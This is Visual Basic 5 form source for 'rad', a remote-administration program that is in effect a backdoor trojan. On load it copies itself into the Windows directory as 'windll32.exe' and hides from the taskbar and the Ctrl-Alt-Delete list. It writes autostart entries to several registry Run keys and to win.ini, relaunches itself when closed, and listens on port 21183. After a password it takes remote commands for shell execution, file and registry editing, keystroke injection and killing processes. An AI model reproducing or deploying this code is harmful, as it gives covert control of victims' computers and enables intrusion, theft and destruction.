VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMain 
   Caption         =   "rad"
   ClientHeight    =   4320
   ClientLeft      =   1680
   ClientTop       =   1545
   ClientWidth     =   6090
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   4320
   ScaleWidth      =   6090
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock winsockMail 
      Left            =   5760
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.ListBox lstSettings 
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2310
      Left            =   0
      TabIndex        =   0
      Top             =   480
      Width           =   6135
   End
   Begin MSWinsockLib.Winsock Winsock 
      Left            =   5400
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label lblPort 
      Caption         =   "21183                                                                                                                          "
      Height          =   255
      Left            =   2040
      TabIndex        =   3
      Top             =   2880
      Width           =   735
   End
   Begin VB.Label lblExe 
      Alignment       =   2  'Center
      Caption         =   "windll32.exe                                                                                  "
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   2880
      Width           =   1695
   End
   Begin VB.Label Label1 
      Caption         =   "[r]emote [ad]min"
      BeginProperty Font 
         Name            =   "Fixedsys"
         Size            =   18
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   3855
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public Response As String, Reply As Integer, DateNow As String
Public first As String, Second As String, Third As String
Public Fourth As String, Fifth As String, Sixth As String
Public Seventh As String, Eighth As String
Public Start As Single, Tmr As Single




Private Sub Form_Load()
On Error Resume Next
Dim newName As String * 30
newName = Trim(lblExe.Caption)
newport = CInt(Val(lblPort.Caption))

If App.Path <> WinDir Then
    If Dir(WinDir & "\" & newName) <> "" Then
        x = KillAppByExe(WinDir & "\" & newName)
        LogEvent "_PDKExe:" & x
        Kill WinDir & "\" & newName
    End If
    FileCopy (App.Path & "\" & App.EXEName & ".exe"), (WinDir & "\" & newName)
    Shell WinDir & "\" & newName
    WaitFor 15
    If Dir(WinDir & "\" & newName) <> "" Then End
End If

On Error Resume Next
'make sure RAD is in the registry autostart list
Me.Hide
DoEvents
App.TaskVisible = False
Hide_Program_In_CTRL_ALT_Delete 'hide the damn thing
'Dim RootHKey As HKeys
'Dim SubDir As String
'Dim hKey As Long
Dim OpenRegOk As Boolean
Dim MyReg As New CReadWriteEasyReg


'add registry entries
OpenRegOk = MyReg.OpenRegistry(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run")
x = MyReg.CreateValue("rad", App.Path & "\" & newName, REG_SZ)
MyReg.CloseRegistry
OpenRegOk = MyReg.OpenRegistry(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\RunServices")
x = MyReg.CreateValue("rad", App.Path & "\" & newName, REG_SZ)
MyReg.CloseRegistry
OpenRegOk = MyReg.OpenRegistry(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run")
x = MyReg.CreateValue("rad", App.Path & "\" & newName, REG_SZ)
MyReg.CloseRegistry
'end add registry entries


'ensure rad is in the win.ini
PutValue "windows", "load", App.Path & "\" & newName, "c:\windows\win.ini"

loadAll 'continue loading rad
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
On Error Resume Next
Shell appPath
End Sub

Private Sub Form_Resize()
On Error Resume Next
lstSettings.Width = Me.Width
lstSettings.Height = Me.Height - 760
End Sub


Private Sub Form_Terminate()
On Error Resume Next
Shell appPath
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Shell appPath
End Sub



Private Sub Winsock_Close()
On Error Resume Next
'bumpy bumpy lumpy?
Authenticated = False
comBuffer = ""
comCurrent = ""


Do While Winsock.State <> sckClosed
LogEvent "-force close"
DoEvents
Winsock.Close
Loop

Do While Winsock.State <> sckListening
LogEvent "-force listen"
DoEvents
Winsock.Listen
Loop
End Sub


Private Sub Winsock_ConnectionRequest(ByVal requestID As Long)
On Error Resume Next
LogEvent "-received requestID(auto-accept): " & requestID

Do While Winsock.State <> sckClosed
    LogEvent "-force close"
    DoEvents
    Winsock.Close
Loop

Authenticated = False
Winsock.Accept requestID
LogEvent "-establishing connection"
Do While Winsock.State <> sckConnected: DoEvents: Loop
LogEvent "-connected to: " & Winsock.RemoteHostIP & " :" & Winsock.LocalPort
Pop "  rad " & App.Major & "." & App.Minor & "." & App.Revision & "  ><  " & CurUserName
Pop "  cmd: " & comChar
Pop ""
Pop serverMessage
Pop ""
Pop "  -AUTHENTICATE-"
Pop ""
Winsock.SendData ": "
End Sub

Private Sub Winsock_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim tmpBuffer As String

Winsock.GetData tmpBuffer 'get buffer

'handle backspaces
If Asc(tmpBuffer) = 8 Then
    Winsock.SendData tmpBuffer 'pop them back a backspace character
    tmpBuffer = ""
    comBuffer = Left(comBuffer, (Len(comBuffer) - 1)) 'decrease string by one(remove last character)
End If
'end handle backspaces


'handle buffer additions
If tmpBuffer <> Chr(13) And tmpBuffer <> Chr(10) Then
    comBuffer = comBuffer & tmpBuffer
    Winsock.SendData tmpBuffer
Else
    Pop ""
End If


'if user sends the 'end of command' character, then flush the buffer
If tmpBuffer = comChar Then
    comBuffer = Left(comBuffer, (Len(comBuffer) - 1)) 'cut the comchar symbol off
    comCurrent = Trim(comBuffer)
    comBuffer = ""
    GoTo parseNow
End If
If comCurrent = "" Then Exit Sub

parseNow:

'catch fucked up packets
If InStr(comCurrent, comChar) <> 0 Then
Do While InStr(comCurrent, comChar) <> 0
    Mid(comCurrent, InStr(comCurrent, comChar), 1) = " "
    DoEvents
Loop
End If
'end of catch fucked up packets

On Error GoTo errorHandler
If (InStr(comCurrent, " ") <> 0) Then comFull = comCurrent 'the full command(params and all)

'parse(get only the command out of the full statement)
spos = InStr(comCurrent, " ")
If spos = 0 Then
    GoTo Interpret
Else
    comCurrent = LCase(Left(comCurrent, (spos - 1)))
    comCurrent = Trim(comCurrent)
End If
'end parse

Interpret:

If Authenticated = False Then
    If comCurrent = serverPass Then
        Authenticated = True
        LogEvent "-authenticated"
        Pop ""
        GoTo allDone
    End If
    If comCurrent <> serverPass Then
        Winsock.Close
        LogEvent "-failed authentication"
        Winsock_Close
        DoEvents
        Exit Sub
    End If
End If

'COMMANDS


Select Case comCurrent

Case "inputbox"
    Call comInputBox

Case "msgbox"
    Call comMsgBox

Case "pwd"
    Pop CurDir

Case "cd"
    ChDir (argArray(1, argCount)): Pop CurDir & ""
    
Case "cdrv", "cdrive"
    ChDrive (argArray(1, argCount)): Pop CurDir & ""

Case "clear"
    Call comClear
    
Case "apppop", "apppopup"
    Call comAppPopUp

Case "sendkeys"
    Call comSendKeys
    
Case "regdirview"
    Call comRegDirView

Case "regkeyview"
    Call comRegKeyView
    
Case "regkeysview"
    Call comRegKeysView

Case "regkeyedit"
    Call comRegKeyEdit

Case "regkeydel"
    Call comRegKeyDel
    
Case "regdircreate"
    Call comRegDirCreate

Case "regdirdel"
    Call comRegDirDel

Case "dir", "ls"
    Call comDir
    
Case "vol", "volume"
    Call comVolume

Case "printfile"
    Call comPrintFile
    
Case "appendfile"
    Call comAppendFile

Case "truncline"
    Call comTruncLine
    
Case "editfile"
    Call comEditFile

Case "delfile", "deletefile"
    Call comDelFile

Case "newfile"
    Call comNewFile
    
Case "movefile"
    Call comMoveFile

Case "copyfile"
    Call comCopyFile

Case "fileinfo"
    Call comFileInfo

Case "fileset"
    Call comFileSet

Case "putini"
    PutValue Parse(comFull, 2), Parse(comFull, 3), argArray(4, argCount), Parse(comFull, 1)
    Pop ""

Case "getini"
    Pop GetValue(Parse(comFull, 2), Parse(comFull, 3), Parse(comFull, 1))

Case "setname"
    Call comSetName
    
Case "sendmail"
    Call comSendMail

Case "cdrom"
    Call comCdOpen
    
Case "exit"
    Pop "_sckClose"
    Winsock_Close
    Exit Sub
    
Case "viewtime"
    Call comViewTime
    
Case "settime"
    Call comSetTime
    
Case "setdate"
    Call comSetDate

Case "shell"
    Call comShell

Case "password"
    Call comPassword

Case "port"
    Call comPort
    
Case "setwelcome"
    Call comSetWelcome
    
Case "system"
    Call comSystem

Case "restart"
    Call comRestart

Case "setvar"
    Call comSetVar

Case "viewvar"
    Call comViewVar

Case "proc"
    Call comProc

Case "kill"
    Call comKill

Case "last"
    Call comLast
    
Case "h", "help"
    Call comHelp

Case "comchar", "command" 'switch command character
    Call comComChar

Case "" 'avoid unknown command
    Pop ""
Case Else
    Pop comCurrent & " > Unknown command"
End Select
    
    
'END OF COMMANDS
    
    
allDone:
'clean the master command buffer and send a prompt
On Error Resume Next
comCurrent = ""
comBuffer = ""
lastCommand = comFull
comFull = ""
Winsock.SendData "#"
Exit Sub

errorHandler:
On Error Resume Next
Pop ""
Pop "Error"
comCurrent = ""
comBuffer = ""
lastCommand = comFull
comFull = ""
Winsock.SendData "#"
End Sub

Private Sub Winsock_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
LogEvent "-winsock error"
Do While Winsock.State <> sckClosed 'force close
LogEvent "-force close"
DoEvents
Winsock.Close
Loop

Do While Winsock.State <> sckListening 'force listen
LogEvent "-force listen"
DoEvents
Winsock.Listen
Loop
End Sub


